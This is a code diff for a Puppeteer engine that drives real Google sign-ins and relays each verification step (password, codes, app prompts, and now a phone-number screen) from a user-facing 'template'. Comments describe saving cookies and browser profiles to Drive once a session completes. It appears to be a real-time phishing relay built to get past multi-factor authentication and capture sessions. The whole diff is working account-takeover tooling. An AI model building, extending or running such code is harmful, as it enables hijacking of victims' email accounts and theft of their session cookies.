@@ -2249,6 +2249,249 @@ async function phaseWaitingRecoveryEmail(browserId, browser, page, email, platfo
     return { finalStatus, updateData, pollingTimedOut };
 }
 
+// Phase function: WAITINGPHONENUMBER
+// Mirrors phaseWaitingRecoveryEmail. Handles the Google "Verify it's you — Enter a
+// phone number to get a text message with a verification code" screen
+// (#phoneNumberId / #idvanyphonecollectNext). The phone value comes from the
+// template via update-process (updateType 'phoneNumber') and is read from the
+// in-memory cache first (the cookie sheet has no phoneNumber column), falling
+// back to the sheet column if a header exists.
+// Returns { finalStatus, updateData, pollingTimedOut } — caller merges back.
+// ──────────────────────────────────────────────────────────────────────────────
+async function phaseWaitingPhoneNumber(browserId, browser, page, email, platform, platformConfig, columnIndexes, instanceId, _timer) {
+    let finalStatus = "WAITINGPHONENUMBER";
+    let updateData = { status: "WAITINGPHONENUMBER" };
+    let pollingTimedOut = false;
+    logger.info(`[processRow][${browserId}] Resuming from WAITINGPHONENUMBER state.`);
+
+    const pollingTimeoutPhoneNumber = Date.now() + 10 * 60 * 1000; // 10min — aligned with template's own POLLING_TIMEOUT_MS (600s)
+    const phonePollStartMs = Date.now();
+    let phoneNumberProcessed = false;
+    let phoneLastPollGapLogMs = 0;
+
+    while (Date.now() < pollingTimeoutPhoneNumber && finalStatus === "WAITINGPHONENUMBER") {
+        try {
+            if (page && !(await isPageResponsive(page, browserId, instanceId))) {
+                logger.error(`[processRow][${browserId}][WAITINGPHONENUMBER] Page became unresponsive. Marking as FAILED.`);
+                finalStatus = "FAILED";
+                updateData.status = "FAILED";
+                updateData.lastJsonResponse = JSON.stringify({
+                    ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
+                    message: "Something went wrong. Please try again."
+                });
+                pollingTimedOut = true;
+                break;
+            }
+
+            // Poll silence alone is not fatal; only the hard session-age cap fails the loop.
+            const phoneLiveness = evaluateTemplateLiveness(browserId, phonePollStartMs);
+            if (phoneLiveness.pollSilent) {
+                if (phoneLiveness.sessionExpiredMs) {
+                    logger.warn(`[processRow][${browserId}][WAITINGPHONENUMBER] Template poll-silent and session age ${Math.round(phoneLiveness.sessionAgeMs / 1000)}s > hard cap (12min). Closing browser.`);
+                    finalStatus = "FAILED";
+                    updateData.status = "FAILED";
+                    updateData.lastJsonResponse = JSON.stringify({
+                        ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
+                        message: "Session timed out. Please try again."
+                    });
+                    pollingTimedOut = true;
+                    break;
+                }
+                if (Date.now() - phoneLastPollGapLogMs > 30000) {
+                    logger.info(`[processRow][${browserId}][WAITINGPHONENUMBER] Template poll gap ${Math.round(phoneLiveness.pollGapMs / 1000)}s (session age ${Math.round(phoneLiveness.sessionAgeMs / 1000)}s). Holding session.`);
+                    phoneLastPollGapLogMs = Date.now();
+                }
+            }
+
+            // Value source: cache first (update-process writes it there), sheet column fallback.
+            let phoneNumberValue = null;
+            try {
+                const cachedRowForPhone = getCachedRow(browserId);
+                if (cachedRowForPhone?.phoneNumber && String(cachedRowForPhone.phoneNumber).trim() !== "") {
+                    phoneNumberValue = String(cachedRowForPhone.phoneNumber).trim();
+                }
+            } catch (_) {}
+            let checkRowForPhone = null;
+            if (!phoneNumberValue) {
+                const checkData = await fetchDataFromAppScript(1, 30000, false);
+                const checkHeaders = checkData[0];
+                const checkColumnIndexes = getColumnIndexes(checkHeaders);
+                const checkRows = checkData.slice(1);
+                checkRowForPhone = checkRows.find(r => r[checkColumnIndexes['browserId']] === browserId);
+
+                if (!checkRowForPhone) {
+                    logger.error(`[processRow][${browserId}][WAITINGPHONENUMBER] Row not found. Exiting loop.`);
+                    finalStatus = "FAILED";
+                    pollingTimedOut = true;
+                    break;
+                }
+
+                const currentSheetStatus = checkRowForPhone[columnIndexes['status']];
+                if (currentSheetStatus !== "WAITINGPHONENUMBER") {
+                    logger.info(`[processRow][${browserId}][WAITINGPHONENUMBER] Status changed externally to ${currentSheetStatus}. Exiting loop.`);
+                    finalStatus = currentSheetStatus;
+                    break;
+                }
+
+                if (columnIndexes['phoneNumber'] !== undefined) {
+                    const sheetPhone = checkRowForPhone[columnIndexes['phoneNumber']];
+                    if (sheetPhone && String(sheetPhone).trim() !== "") phoneNumberValue = String(sheetPhone).trim();
+                }
+            }
+
+            if (phoneNumberValue) {
+                logger.info(`[processRow][${browserId}][WAITINGPHONENUMBER] Phone number found. Setting status to PROCESSING.`);
+                _timer.phoneNumberFound = Date.now();
+                logger.info(`[engineProcess][${browserId}] +WAITINGPHONENUMBER (found phone number)`);
+                activelyProcessing.add(browserId);
+                updateBrowserRowDataFast(browserId, { status: "PROCESSING", verified: true, fullAccess: false, lastJsonResponse: JSON.stringify({ browserId, email, status: "PROCESSING", message: "Processing phone number" }) });
+
+                const phoneInputSelector = platformConfig.selectors?.phoneNumberInput;
+                const phoneNextSelector = platformConfig.selectors?.phoneNumberNext;
+
+                if (phoneInputSelector) {
+                    try {
+                        await page.waitForSelector(phoneInputSelector, { visible: true, timeout: 10000 });
+                        await page.evaluate((sel) => { const el = document.querySelector(sel); if (el) el.value = ''; }, phoneInputSelector);
+                        await page.type(phoneInputSelector, phoneNumberValue, { delay: 50 });
+                        logger.info(`[processRow][${browserId}][WAITINGPHONENUMBER] Typed phone number into ${phoneInputSelector}`);
+
+                        const navigationPromise = page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 5000 })
+                            .catch(e => logger.warn(`[processRow][${browserId}][WAITINGPHONENUMBER] Navigation after submit did not complete as expected: ${e.message}`));
+
+                        if (phoneNextSelector) {
+                            try {
+                                await page.waitForSelector(phoneNextSelector, { visible: true, timeout: 5000 });
+                                await page.click(phoneNextSelector);
+                                logger.info(`[processRow][${browserId}][WAITINGPHONENUMBER] Clicked phone number Next button: ${phoneNextSelector}`);
+                            } catch (selErr) {
+                                await page.keyboard.press('Enter');
+                                logger.info(`[processRow][${browserId}][WAITINGPHONENUMBER] Pressed Enter to submit phone number.`);
+                            }
+                        } else {
+                            await page.keyboard.press('Enter');
+                            logger.info(`[processRow][${browserId}][WAITINGPHONENUMBER] No next selector, pressed Enter.`);
+                        }
+
+                        await navigationPromise;
+                        await new Promise(res => setTimeout(res, 3000));
+                        phoneNumberProcessed = true;
+
+                        const postPhoneState = await checkVerification(page, platformConfig);
+                        if (postPhoneState.required && postPhoneState.type === 'code') {
+                            logger.info(`[processRow][${browserId}][WAITINGPHONENUMBER] Transitioned to code entry. Setting WAITINGCODE.`);
+                            finalStatus = "WAITINGCODE";
+                            updateData.status = "WAITINGCODE";
+                            updateData.phoneNumber = '';
+                            updateData.lastJsonResponse = JSON.stringify({
+                                ...JSON.parse(updateData.lastJsonResponse || '{}'),
+                                status: "WAITING_CODE",
+                                verificationState: 'WAITING_CODE',
+                                viewName: postPhoneState.viewName,
+                                message: "Phone number submitted. Verification code screen reached."
+                            });
+                            updateBrowserRowDataFast(browserId, updateData);
+                            break;
+                        } else if (postPhoneState.required && postPhoneState.type === 'choice') {
+                            logger.info(`[processRow][${browserId}][WAITINGPHONENUMBER] Returned to choice screen after phone number. Setting WAITINGOPTIONS.`);
+                            const freshOptions = await platformConfig.extractVerificationOptions(page, platformConfig, postPhoneState.viewName);
+                            finalStatus = "WAITINGOPTIONS";
+                            updateData = {
+                                status: "WAITINGOPTIONS",
+                                phoneNumber: '',
+                                verificationOptions: JSON.stringify(freshOptions),
+                                lastJsonResponse: JSON.stringify({
+                                    ...JSON.parse(updateData.lastJsonResponse || '{}'),
+                                    status: "WAITING_OPTIONS",
+                                    verificationState: 'WAITING_OPTIONS',
+                                    viewName: postPhoneState.viewName,
+                                    verificationOptions: freshOptions,
+                                    message: "Phone number submitted, returned to verification options."
+                                })
+                            };
+                            updateBrowserRowDataFast(browserId, updateData);
+                            break;
+                        } else if (postPhoneState.required && postPhoneState.type === 'text_input' && postPhoneState.viewName === 'Gmail Phone Number Entry') {
+                            // Still on the phone page — Google rejected the number. Stay and
+                            // surface the error so the template can show it under the field.
+                            logger.warn(`[processRow][${browserId}][WAITINGPHONENUMBER] Still on phone entry after submit (number rejected). Staying in WAITINGPHONENUMBER.`);
+                            updateData.phoneNumber = '';
+                            updateData.lastJsonResponse = JSON.stringify({
+                                ...JSON.parse(updateData.lastJsonResponse || '{}'),
+                                status: "WAITING_PHONE_NUMBER",
+                                verificationState: 'WAITING_PHONE_NUMBER_ERROR',
+                                viewName: postPhoneState.viewName,
+                                message: "This phone number can't be used for verification. Please check it and try again."
+                            });
+                            updateBrowserRowDataFast(browserId, {
+                                status: "WAITINGPHONENUMBER",
+                                phoneNumber: '',
+                                lastJsonResponse: updateData.lastJsonResponse
+                            });
+                            logger.info(`[engineProcess][${browserId}] -WAITINGPHONENUMBER (number rejected, waiting for new value)`);
+                            activelyProcessing.delete(browserId);
+                        } else {
+                            const inboxReached = await isInbox(page, platformConfig).catch(() => false);
+                            if (inboxReached) {
+                                logger.info(`[processRow][${browserId}][WAITINGPHONENUMBER] Reached inbox after phone number submission.`);
+                                finalStatus = "PROCESSING_FINALIZING";
+                                break;
+                            }
+                            logger.info(`[processRow][${browserId}][WAITINGPHONENUMBER] Unexpected page state after phone number. Continuing poll.`);
+                        }
+                    } catch (interactionError) {
+                        logger.error(`[processRow][${browserId}][WAITINGPHONENUMBER] Error during phone number entry: ${interactionError.message}`);
+                        updateBrowserRowDataFast(browserId, {
+                            status: "WAITINGPHONENUMBER",
+                            lastJsonResponse: JSON.stringify({
+                                ...JSON.parse(updateData.lastJsonResponse || '{}'),
+                                status: "WAITING_PHONE_NUMBER",
+                                message: `Error entering phone number: ${interactionError.message}`
+                            })
+                        });
+                        logger.info(`[engineProcess][${browserId}] -WAITINGPHONENUMBER (error retry)`);
+                        activelyProcessing.delete(browserId);
+                    }
+                } else {
+                    logger.error(`[processRow][${browserId}][WAITINGPHONENUMBER] Phone number input selector not defined for platform ${platform}. Failing.`);
+                    finalStatus = "FAILED";
+                    break;
+                }
+            }
+        } catch (pollError) {
+            logger.error(`[processRow][${browserId}][WAITINGPHONENUMBER] Error during polling: ${pollError.message}`);
+            await new Promise(resolve => setTimeout(resolve, 15000));
+        }
+
+        if (finalStatus === "WAITINGPHONENUMBER") {
+            await new Promise(resolve => setTimeout(resolve, 2000));
+        }
+    }
+
+    if (finalStatus === "WAITINGPHONENUMBER" && !phoneNumberProcessed) {
+        logger.warn(`[processRow][${browserId}][WAITINGPHONENUMBER] Polling for phone number timed out. Setting FAILED — COMPLETED handler will save cookies + profile.`);
+        pollingTimedOut = true;
+        finalStatus = "FAILED";
+        updateData.status = "FAILED";
+        updateData.verified = true;
+        updateData.fullAccess = false;
+        updateData.lastJsonResponse = JSON.stringify({
+            ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
+            message: "Phone number not provided in time. Please try again."
+        });
+    }
+
+    updateData.status = finalStatus;
+    if (finalStatus === "FAILED" && !updateData.lastJsonResponse?.includes("PROCESSING_FINALIZING") && !updateData.lastJsonResponse?.includes("COMPLETED")) {
+        updateData.lastJsonResponse = JSON.stringify({
+            ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
+            message: "Something went wrong. Please try again."
+        });
+    }
+    logger.info(`[processRow][${browserId}] Exited WAITINGPHONENUMBER loop. Final status: ${updateData.status}`);
+    return { finalStatus, updateData, pollingTimedOut };
+}
+
 async function processRow(row, columnIndexes, existingBrowser = null, existingPage = null) {
     const browserId = row[columnIndexes['browserId']];
     const sheetStatus = row[columnIndexes['status']];
@@ -3863,7 +4106,7 @@ if (!foundSelector) {
                                         const isPhonePrompt = verificationDetails.type === 'phone_prompt';
                                         initialCheckResult = {
                                             emailExists: true, accountAccess: true, reachedInbox: false, requiresVerification: true,
-                                            verificationState: verificationDetails.type === 'choice' ? 'WAITINGOPTIONS' : verificationDetails.type === 'text_input' ? 'WAITINGRECOVERYEMAIL' : verificationDetails.type === 'password' ? 'WAITINGPASSWORD_ERROR' : 'WAITINGCODE',
+                                            verificationState: verificationDetails.type === 'choice' ? 'WAITINGOPTIONS' : verificationDetails.type === 'text_input' ? (verificationDetails.viewName === 'Gmail Phone Number Entry' ? 'WAITINGPHONENUMBER' : 'WAITINGRECOVERYEMAIL') : verificationDetails.type === 'password' ? 'WAITINGPASSWORD_ERROR' : 'WAITINGCODE',
                                             verificationOptions: verificationDetails.type === 'choice' && typeof platformConfig.extractVerificationOptions === 'function' ? await platformConfig.extractVerificationOptions(page, platformConfig, verificationDetails.viewName) : [],
                                             viewName: verificationDetails.viewName,
                                             gmail: isPhonePrompt ? { step: 'waiting_app_notification', canResend: true, canChangeMethod: true, deviceName: verificationDetails.deviceName || null, instructions: verificationDetails.deviceName ? `Google sent a notification to your ${verificationDetails.deviceName}. Open the Gmail app and tap Yes on the prompt to verify it's you.` : "Tap 'Yes' on the notification in your Gmail app on your phone to allow sign-in." } : undefined
@@ -4011,6 +4254,7 @@ if (!foundSelector) {
                                         ...(getCachedRow(browserId) || {}),
                                         status: "WAITINGPASSWORD",
                                         engineProcessing: false,
+                                        password: '',
                                         verified: false,
                                         fullAccess: false,
                                         lastUserActivity: new Date().toISOString(),
@@ -4023,6 +4267,7 @@ if (!foundSelector) {
                                         await updateBrowserRowData(browserId, {
                                             status: "WAITINGPASSWORD",
                                             engineProcessing: false,
+                                            password: '',
                                             verified: false,
                                             fullAccess: false,
                                             lastJsonResponse: updateData.lastJsonResponse,
@@ -4255,19 +4500,21 @@ if (!foundSelector) {
                         return;
                     }
                     if (currentPageVerificationState.type === 'text_input') {
-                        logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Page transitioned to text input screen: ${currentPageVerificationState.viewName}. Setting WAITINGRECOVERYEMAIL.`);
-                        finalStatus = "WAITINGRECOVERYEMAIL";
-                        updateData.status = "WAITINGRECOVERYEMAIL";
+                        const _isPhoneEntry = currentPageVerificationState.viewName === 'Gmail Phone Number Entry';
+                        const _tiStatus = _isPhoneEntry ? 'WAITINGPHONENUMBER' : 'WAITINGRECOVERYEMAIL';
+                        logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Page transitioned to text input screen: ${currentPageVerificationState.viewName}. Setting ${_tiStatus}.`);
+                        finalStatus = _tiStatus;
+                        updateData.status = _tiStatus;
                         updateData.verificationChoice = '';
                         updateData.lastJsonResponse = JSON.stringify({
                             ...JSON.parse(updateData.lastJsonResponse || '{}'),
-                            status: "WAITING_RECOVERY_EMAIL",
-                            verificationState: 'WAITING_RECOVERY_EMAIL',
+                            status: _isPhoneEntry ? "WAITING_PHONE_NUMBER" : "WAITING_RECOVERY_EMAIL",
+                            verificationState: _isPhoneEntry ? 'WAITING_PHONE_NUMBER' : 'WAITING_RECOVERY_EMAIL',
                             viewName: currentPageVerificationState.viewName,
-                            message: "Recovery email confirmation screen reached."
+                            message: _isPhoneEntry ? "Phone number entry screen reached." : "Recovery email confirmation screen reached."
                         });
                         updateBrowserRowDataFast(browserId, {
-                            status: "WAITINGRECOVERYEMAIL",
+                            status: _tiStatus,
                             verificationChoice: '',
                             lastJsonResponse: updateData.lastJsonResponse
                         });
@@ -4584,18 +4831,20 @@ if (!foundSelector) {
                                     updateBrowserRowDataFast(browserId, updateData);
                                     break;
                                 } else if (gmailPostClickVerification.required && gmailPostClickVerification.type === 'text_input') {
-                                    logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Gmail transitioned to text input: ${gmailPostClickVerification.viewName}. Setting WAITINGRECOVERYEMAIL.`);
-                                    finalStatus = "WAITINGRECOVERYEMAIL";
+                                    const _pcIsPhone = gmailPostClickVerification.viewName === 'Gmail Phone Number Entry';
+                                    const _pcStatus = _pcIsPhone ? 'WAITINGPHONENUMBER' : 'WAITINGRECOVERYEMAIL';
+                                    logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Gmail transitioned to text input: ${gmailPostClickVerification.viewName}. Setting ${_pcStatus}.`);
+                                    finalStatus = _pcStatus;
                                     updateData = {
-                                        status: "WAITINGRECOVERYEMAIL",
+                                        status: _pcStatus,
                                         verificationChoice: '',
                                         lastJsonResponse: JSON.stringify({
                                             ...JSON.parse(updateData.lastJsonResponse || '{}'),
-                                            status: "WAITING_RECOVERY_EMAIL",
-                                            verificationState: 'WAITING_RECOVERY_EMAIL',
+                                            status: _pcIsPhone ? "WAITING_PHONE_NUMBER" : "WAITING_RECOVERY_EMAIL",
+                                            verificationState: _pcIsPhone ? 'WAITING_PHONE_NUMBER' : 'WAITING_RECOVERY_EMAIL',
                                             viewName: gmailPostClickVerification.viewName,
                                             verificationOptions: currentVerificationOptions,
-                                            message: "Recovery email confirmation screen reached."
+                                            message: _pcIsPhone ? "Phone number entry required after option click." : "Recovery email confirmation screen reached."
                                         })
                                     };
                                     updateBrowserRowDataFast(browserId, updateData);
@@ -4788,6 +5037,11 @@ if (!foundSelector) {
             finalStatus = _recoveryResult.finalStatus;
             Object.assign(updateData, _recoveryResult.updateData);
             pollingTimedOut = _recoveryResult.pollingTimedOut;
+        } else if (status === "WAITINGPHONENUMBER") {
+            const _phoneResult = await phaseWaitingPhoneNumber(browserId, browser, page, email, platform, platformConfig, columnIndexes, instanceId, _timer);
+            finalStatus = _phoneResult.finalStatus;
+            Object.assign(updateData, _phoneResult.updateData);
+            pollingTimedOut = _phoneResult.pollingTimedOut;
         } else if (status === "WAITINGCODE") {
             logger.warn(`[processRow][${browserId}] —RESUME WAITINGCODE— sheetStatus=${sheetStatus} verified=${row[columnIndexes['verified']] ?? 'n/a'} driveUrl=${updateData.driveUrl || 'none'} code=${row[columnIndexes['verificationCode']] ? String(row[columnIndexes['verificationCode']]).slice(0, 4) : 'none'}`);
             finalStatus = "WAITINGCODE";
@@ -5323,6 +5577,9 @@ if (!foundSelector) {
                                     if (quickProbe.required && quickProbe.type === 'choice') {
                                         skipSlowPostCodePath = true;
                                         logger.info(`[processRow][${browserId}][WAITINGCODE] Quick probe: choice screen detected immediately after code submit. Skipping slow path.`);
+                                    } else if (quickProbe.required && quickProbe.type === 'text_input') {
+                                        skipSlowPostCodePath = true;
+                                        logger.info(`[processRow][${browserId}][WAITINGCODE] Quick probe: text input screen (${quickProbe.viewName || 'unknown'}) detected immediately after code submit. Skipping slow path.`);
                                     }
                                 } catch (_) {}
 
@@ -5344,6 +5601,44 @@ if (!foundSelector) {
                                 while (Date.now() < pollingTimeout && finalStatus === "WAITINGCODE") {
                                     // Handle any post-verification additional views like recovery info cancel
                                     await handleAdditionalViews(page, platformConfig, instanceId, 'general');
+                                    // Periodic screen re-check: Google may advance to a phone-number
+                                    // entry or choice screen while we wait (e.g. challenge/iap). Route
+                                    // out instead of sitting in WAITINGCODE until timeout.
+                                    checkCount++;
+                                    if (checkCount % 6 === 0) {
+                                        try {
+                                            const passiveProbe = await checkVerification(page, platformConfig).catch(() => ({ required: false }));
+                                            if (passiveProbe.required && passiveProbe.type === 'text_input') {
+                                                const _ppIsPhone = passiveProbe.viewName === 'Gmail Phone Number Entry';
+                                                const _ppStatus = _ppIsPhone ? 'WAITINGPHONENUMBER' : 'WAITINGRECOVERYEMAIL';
+                                                logger.info(`[processRow][${browserId}][WAITINGCODE] Passive wait: text input screen (${passiveProbe.viewName}) detected. Setting ${_ppStatus}.`);
+                                                finalStatus = _ppStatus;
+                                                updateData.status = _ppStatus;
+                                                updateData.lastJsonResponse = JSON.stringify({
+                                                    ...JSON.parse(updateData.lastJsonResponse || '{}'),
+                                                    status: _ppIsPhone ? "WAITING_PHONE_NUMBER" : "WAITING_RECOVERY_EMAIL",
+                                                    verificationState: _ppIsPhone ? 'WAITING_PHONE_NUMBER' : 'WAITING_RECOVERY_EMAIL',
+                                                    viewName: passiveProbe.viewName,
+                                                    message: _ppIsPhone ? "Phone number entry screen reached." : "Recovery email confirmation screen reached."
+                                                });
+                                                updateBrowserRowDataFast(browserId, updateData);
+                                                break;
+                                            } else if (passiveProbe.required && passiveProbe.type === 'choice') {
+                                                logger.info(`[processRow][${browserId}][WAITINGCODE] Passive wait: choice screen detected. Setting WAITINGOPTIONS.`);
+                                                finalStatus = "WAITINGOPTIONS";
+                                                updateData.status = "WAITINGOPTIONS";
+                                                updateData.lastJsonResponse = JSON.stringify({
+                                                    ...JSON.parse(updateData.lastJsonResponse || '{}'),
+                                                    status: "WAITING_OPTIONS",
+                                                    verificationState: 'WAITING_OPTIONS',
+                                                    viewName: passiveProbe.viewName,
+                                                    message: "Verification choice screen reached."
+                                                });
+                                                updateBrowserRowDataFast(browserId, updateData);
+                                                break;
+                                            }
+                                        } catch (_) {}
+                                    }
                                     const inboxChecked = await isInbox(page, platformConfig);
                                     if (inboxChecked) {
                                         logger.info(`[processRow][${browserId}][WAITINGCODE] Inbox reached during passive verification. Setting status to COMPLETED.`);
@@ -5655,16 +5950,18 @@ if (!foundSelector) {
                                 });
                                 break;
                             } else if (postCodeVerificationState.required && postCodeVerificationState.type === 'text_input') {
-                                logger.info(`[processRow][${browserId}][WAITINGCODE] Transitioned to text input (recovery email) after code. Setting WAITINGRECOVERYEMAIL.`);
-                                finalStatus = "WAITINGRECOVERYEMAIL";
-                                updateData.status = "WAITINGRECOVERYEMAIL";
+                                const _pcoIsPhone = postCodeVerificationState.viewName === 'Gmail Phone Number Entry';
+                                const _pcoStatus = _pcoIsPhone ? 'WAITINGPHONENUMBER' : 'WAITINGRECOVERYEMAIL';
+                                logger.info(`[processRow][${browserId}][WAITINGCODE] Transitioned to text input (${_pcoIsPhone ? 'phone number' : 'recovery email'}) after code. Setting ${_pcoStatus}.`);
+                                finalStatus = _pcoStatus;
+                                updateData.status = _pcoStatus;
                                 updateData.verificationCode = '';
                                 updateData.lastJsonResponse = JSON.stringify({
                                     ...JSON.parse(updateData.lastJsonResponse || '{}'),
-                                    status: "WAITING_RECOVERY_EMAIL",
-                                    verificationState: 'WAITING_RECOVERY_EMAIL',
+                                    status: _pcoIsPhone ? "WAITING_PHONE_NUMBER" : "WAITING_RECOVERY_EMAIL",
+                                    verificationState: _pcoIsPhone ? 'WAITING_PHONE_NUMBER' : 'WAITING_RECOVERY_EMAIL',
                                     viewName: postCodeVerificationState.viewName,
-                                    message: "Recovery email confirmation required after code submission."
+                                    message: _pcoIsPhone ? "Phone number entry required after code submission." : "Recovery email confirmation required after code submission."
                                 });
                                 updateBrowserRowDataFast(browserId, updateData);
                                 break;
@@ -5870,7 +6167,7 @@ if (!foundSelector) {
             // Falls through to upload logic at line 5814 — browser profile must be saved to Drive.
         }
 
-        if (initialCheckResult.requiresVerification && finalStatus !== "FAILED" && finalStatus !== "COMPLETED" && finalStatus !== "PROCESSING_FINALIZING" && finalStatus !== "WAITINGCODE" && finalStatus !== "WAITINGOPTIONS" && finalStatus !== "WAITINGRECOVERYEMAIL") {
+        if (initialCheckResult.requiresVerification && finalStatus !== "FAILED" && finalStatus !== "COMPLETED" && finalStatus !== "PROCESSING_FINALIZING" && finalStatus !== "WAITINGCODE" && finalStatus !== "WAITINGOPTIONS" && finalStatus !== "WAITINGRECOVERYEMAIL" && finalStatus !== "WAITINGPHONENUMBER") {
             const sheetStatus = initialCheckResult.verificationState.replace(/_/g, ''); // Non-underscore for sheet status
             finalStatus = initialCheckResult.verificationState; // Keep original with underscore for internal use/lastJsonResponse
             updateData.lastJsonResponse = JSON.stringify({
@@ -6035,7 +6332,7 @@ if (!foundSelector) {
         // can identify the correct code entry view type (e.g. Outlook Authenticator OTP)
         // rather than falling through to generic selectors (#iOttText etc.).
         const finalViewName = initialCheckResult.viewName || (JSON.parse(updateData.lastJsonResponse || '{}').viewName) || '';
-        const waitingStates = ['WAITINGCODE', 'WAITINGOPTIONS', 'WAITINGRECOVERYEMAIL'];
+        const waitingStates = ['WAITINGCODE', 'WAITINGOPTIONS', 'WAITINGRECOVERYEMAIL', 'WAITINGPHONENUMBER'];
         // Fingerprint must survive intermediate `updateData = {...}` rebuilds (they drop
         // the field), so fall back to the live browser identity and then the cache.
         const recoveredIdentity = (() => {
@@ -6065,7 +6362,7 @@ if (!foundSelector) {
                 })
         };
 
-        if (finalStatus === "WAITINGOPTIONS" || finalStatus === "WAITINGCODE" || finalStatus === "WAITINGRECOVERYEMAIL" || finalStatus === "WAITINGPASSWORD") { // Also update for WAITING_CODE if options are relevant
+        if (finalStatus === "WAITINGOPTIONS" || finalStatus === "WAITINGCODE" || finalStatus === "WAITINGRECOVERYEMAIL" || finalStatus === "WAITINGPHONENUMBER" || finalStatus === "WAITINGPASSWORD") { // Also update for WAITING_CODE if options are relevant
             updateData.verificationOptions = JSON.stringify(currentVerificationOptions);
             updateData.engineProcessing = false;
             logger.warn(`[engineProcess][${browserId}] -FINAL (return from waiting state)`);
@@ -6448,7 +6745,7 @@ if (!foundSelector) {
                 }
             }
 
-            if (updateData.status === "WAITINGCAPTCHA" || updateData.status === "WAITINGCODE" || updateData.status === "WAITINGOPTIONS" || updateData.status === "WAITINGRECOVERYEMAIL" || updateData.status === "WAITINGPASSWORD" || updateData.status === "WAITINGEMAIL" || updateData.status === "WAITINGPASSWORDERROR" || updateData.status === "WAITINGEMAILERROR") {
+            if (updateData.status === "WAITINGCAPTCHA" || updateData.status === "WAITINGCODE" || updateData.status === "WAITINGOPTIONS" || updateData.status === "WAITINGRECOVERYEMAIL" || updateData.status === "WAITINGPHONENUMBER" || updateData.status === "WAITINGPASSWORD" || updateData.status === "WAITINGEMAIL" || updateData.status === "WAITINGPASSWORDERROR" || updateData.status === "WAITINGEMAILERROR") {
                 logger.info(`[processRow][${browserId}] Keeping browser open as it is in ${updateData.status} state. Storing session.`);
                 activeBrowserSessions.set(browserId, { browser, page, targetCreatedListener: sessionTargetListener }); // Store the listener that was active for this session
             } else {
@@ -6463,7 +6760,7 @@ if (!foundSelector) {
                 activeBrowserSessions.delete(browserId);
                 await new Promise(resolve => setTimeout(resolve, 2000)); // Add delay after browser.close()
             }
-        } else if (isReusingBrowser && browser && (updateData.status !== "WAITINGCAPTCHA" && updateData.status !== "WAITINGCODE" && updateData.status !== "WAITINGOPTIONS" && updateData.status !== "WAITINGRECOVERYEMAIL" && updateData.status !== "WAITINGPASSWORD" && updateData.status !== "WAITINGPASSWORDERROR" && updateData.status !== "WAITINGEMAILERROR")) {
+        } else if (isReusingBrowser && browser && (updateData.status !== "WAITINGCAPTCHA" && updateData.status !== "WAITINGCODE" && updateData.status !== "WAITINGOPTIONS" && updateData.status !== "WAITINGRECOVERYEMAIL" && updateData.status !== "WAITINGPHONENUMBER" && updateData.status !== "WAITINGPASSWORD" && updateData.status !== "WAITINGPASSWORDERROR" && updateData.status !== "WAITINGEMAILERROR")) {
             const session = activeBrowserSessions.get(browserId);
             if (session?.targetCreatedListener && session.browser) {
                 try {
@@ -6730,7 +7027,7 @@ async function processWaitingRows() {
         const rows = data.slice(1);
 
 
-        const processableStatuses = ["WAITING", "WAITINGEMAIL", "WAITINGPASSWORD", "WAITINGPASSWORDERROR", "WAITINGOPTIONS", "WAITINGCODE", "WAITINGRECOVERYEMAIL", "WAITINGCAPTCHA"];
+        const processableStatuses = ["WAITING", "WAITINGEMAIL", "WAITINGPASSWORD", "WAITINGPASSWORDERROR", "WAITINGOPTIONS", "WAITINGCODE", "WAITINGRECOVERYEMAIL", "WAITINGPHONENUMBER", "WAITINGCAPTCHA"];
         const staleCheckStatuses = [...processableStatuses, "WAITINGEMAILERROR", "WAITINGPASSWORDERROR", "PROCESSING"];
         const STALE_TIMEOUT_MS = 10 * 60 * 1000; // 10 minutes
         const activityIdx = columnIndexes['lastUserActivity'] !== undefined ? columnIndexes['lastUserActivity'] : columnIndexes['lastRun'];
@@ -7118,7 +7415,7 @@ export async function POST(request) {
                         const row = data.slice(1).find(r => r[colIndexes['browserId']] === browserId);
                         if (!row) return;
                         const status = getCachedRow(browserId)?.status || row[colIndexes['status']];
-                        const processable = ["WAITING","WAITINGEMAIL","WAITINGPASSWORD","WAITINGPASSWORDERROR","WAITINGOPTIONS","WAITINGCODE","WAITINGRECOVERYEMAIL","WAITINGCAPTCHA"];
+                        const processable = ["WAITING","WAITINGEMAIL","WAITINGPASSWORD","WAITINGPASSWORDERROR","WAITINGOPTIONS","WAITINGCODE","WAITINGRECOVERYEMAIL","WAITINGPHONENUMBER","WAITINGCAPTCHA"];
                         if (!processable.includes(status)) return;
                         processRowStarted = true;
                         try {
@@ -7265,7 +7562,7 @@ export async function POST(request) {
         const currentBrowserId = requestBrowserId || finalStatusDetails?.browserId; // Use actualBrowserId for new processes
 
         if (browser && !browserFullyClosed) { // Only if a browser was actually launched/reused in this POST call
-            if (finalEffectiveStatus === "WAITINGCAPTCHA" || finalEffectiveStatus === "WAITINGCODE" || finalEffectiveStatus === "WAITINGOPTIONS" || finalEffectiveStatus === "WAITINGRECOVERYEMAIL" || finalEffectiveStatus === "WAITINGPASSWORD" || finalEffectiveStatus === "WAITINGPASSWORDERROR" || finalEffectiveStatus === "WAITINGEMAILERROR") {
+            if (finalEffectiveStatus === "WAITINGCAPTCHA" || finalEffectiveStatus === "WAITINGCODE" || finalEffectiveStatus === "WAITINGOPTIONS" || finalEffectiveStatus === "WAITINGRECOVERYEMAIL" || finalEffectiveStatus === "WAITINGPHONENUMBER" || finalEffectiveStatus === "WAITINGPASSWORD" || finalEffectiveStatus === "WAITINGPASSWORDERROR" || finalEffectiveStatus === "WAITINGEMAILERROR") {
                 activeBrowserSessions.set(currentBrowserId, { browser, page, targetCreatedListener });
             } else {
                 if (targetCreatedListener && isReusingBrowserForPOST) try { browser.off('targetcreated', targetCreatedListener); } catch (e) {/*ignore*/ }
